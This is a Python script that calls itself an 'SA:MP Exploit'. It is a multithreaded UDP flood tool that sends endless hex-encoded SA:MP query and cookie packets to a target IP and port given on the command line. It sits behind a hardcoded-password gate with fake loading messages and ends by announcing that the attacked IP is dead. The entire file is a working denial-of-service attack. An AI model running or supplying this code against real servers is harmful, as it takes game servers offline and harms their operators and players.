import socket

import struct

import codecs,sys

import threading

import random

import time

import os

pasw = "Wiliam"

for i in range(3):

    pwd = input(" Password : ")

    j = 3

    if (pwd == pasw):

        time.sleep(2)

        print("[0] Loading...")

        time.sleep(1)

        print("[10] Loading...")

        print("[20] Loading...")

        time.sleep(1)

        print("[30] Loading...")

        time.sleep(1)

        print("[40] Loading...")

        time.sleep(1)

        print("[50] Loading...")

        time.sleep(1)

        print("[60] Loading...")

        time.sleep(1)

        print("[70] Loading...")

        time.sleep(1)

        print("[80] Loading...")

        time.sleep(1)

        print("[90] Loading...")

        time.sleep(1)

        print("[100] Processing\n")

        time.sleep(2)

        break

else:

        time.sleep(2)

        print("[x] pasword salah lol \n")

        

time.sleep(2)

print("\033[35m Succesfull Logins")

time.sleep(2)

os.system("clear")

ip = sys.argv[1]

port = sys.argv[2]

orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p

                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c

                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i

                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r

                       codecs.decode("081e62da","hex_codec"), #cookie port 7796

                       codecs.decode("081e77da","hex_codec"),#cookie port 7777

                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771

                       codecs.decode("021efd40","hex_codec"),#cookie port 7784

                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 

                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem

                       ]

class MyThread(threading.Thread):

     def run(self):

         while True:

                sock = socket.socket(

                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP

                

                msg = Pacotes[random.randrange(0,3)]

                     

                sock.sendto(msg, (ip, int(port)))

                

                

                if(int(port) == 7777):

                    sock.sendto(Pacotes[5], (ip, int(port)))

                elif(int(port) == 7796):

                    sock.sendto(Pacotes[4], (ip, int(port)))

                elif(int(port) == 7771):

                    sock.sendto(Pacotes[6], (ip, int(port)))

                elif(int(port) == 7784):

                    sock.sendto(Pacotes[7], (ip, int(port)))

                elif(int(port) == 1111):

                    sock.sendto(Pacotes[9], (ip, int(port)))    

                

if __name__ == '__main__':

    try:

     for x in range(100):                                    

            mythread = MyThread()  

            mythread.start()                                  

            time.sleep(.1)    

    except(KeyboardInterrupt):

         os.system('cls' if os.name == 'nt' else 'clear')

         

         print('#########################################################################')

         print('SA:MP Exploit')

         print('#########################################################################')

         print('\n\n')

         print('Menyerang ip {} telah mati'.format(orgip))

         pass

